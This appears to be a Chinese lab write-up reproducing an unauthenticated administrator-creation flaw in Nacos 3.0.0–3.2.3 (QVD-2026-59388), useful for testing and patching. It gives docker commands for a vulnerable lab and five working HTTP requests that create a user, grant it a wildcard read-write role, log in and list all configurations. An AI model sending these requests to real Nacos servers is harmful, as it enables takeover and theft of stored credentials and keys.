---
title: "Nacos 3.x 未授权创建管理员漏洞"
date: 2026-10-27 00:00:00
tags:
  - Nacos
  - 未授权
  - 权限提升
  - QVD-2026-59388
  - 漏洞复现
categories:
  - [vulhub靶场, nacos]
---

# Nacos 3.x 未授权创建管理员漏洞

**Nacos 权限绕过漏洞（QVD-2026-59388）** 是一个高危漏洞，攻击者无需任何凭证即可创建管理员账户，完全接管 Nacos 服务端。

- **影响版本**：Nacos 3.0.0 至 3.2.3
- **修复版本**：Nacos 3.2.4 及以上

- **CVSS 评分**：9.8（严重）
- **成因**：用户、角色、权限管理接口的 `@Secured` 注解漏写了 `apiType = ADMIN_API`，导致这些接口落入默认关闭鉴权的 `OPEN_API` 作用域，被直接放行
- **危害**：未授权创建账户 → 绑定角色 → 授予 `*:rw` 通配权限 → 登录获取 Token，最终可读取所有配置（含数据库密码、API 密钥等），甚至修改配置导致业务中断。

拉取镜像

```
sudo docker pull nacos/nacos-server:v3.2.3
```

启动靶场

```
sudo docker run -d --name nacos-vuln \
  -p 8848:8848 -p 9848:9848 -p 8080:8080 \
  -e MODE=standalone \
  -e NACOS_AUTH_TOKEN=SecretKey012345678901234567890123456789012345678901234567890123456789 \
  -e NACOS_AUTH_IDENTITY_KEY=serverIdentity \
  -e NACOS_AUTH_IDENTITY_VALUE=security \
  nacos/nacos-server:v3.2.3
```

删除容器

```
sudo docker rm -f nacos-vuln
```

## Payload

### step1未授权创建用户

```
POST /nacos/v3/auth/user HTTP/1.1
Host: 192.168.162.128:8848
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Connection: close

username=hacker01&password=Hack@123456
```

![image-20261021164829647](/img/nacos/image-20261021164829647.png)

### step2未授权绑定用户的角色

```
POST /nacos/v3/auth/role HTTP/1.1
Host: 192.168.162.128:8848
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Connection: close

username=hacker01&role=super_role
```

![image-20261021164901315](/img/nacos/image-20261021164901315.png)

### step3未授权给角色授予最高权限

```
POST /nacos/v3/auth/permission HTTP/1.1
Host: 192.168.162.128:8848
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Connection: close

role=super_role&resource=*&action=rw            //super_role角色权限资产全部可读写
```

![image-20261021164933342](/img/nacos/image-20261021164933342.png)

### step4登录获取 Token

```
POST /nacos/v3/auth/user/login HTTP/1.1
Host: 192.168.162.128:8848
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Connection: close

username=hacker01&password=Hack@123456
```

![image-20261021165022046](/img/nacos/image-20261021165022046.png)

### step5验证权限提权是否成功

```
GET /nacos/v3/admin/cs/config/list?pageNo=1&pageSize=10 HTTP/1.1
Host: 192.168.162.128:8848
accessToken: 这里替换成你刚拿到的Token
Connection: close

```

![image-20261021165154471](/img/nacos/image-20261021165154471.png)
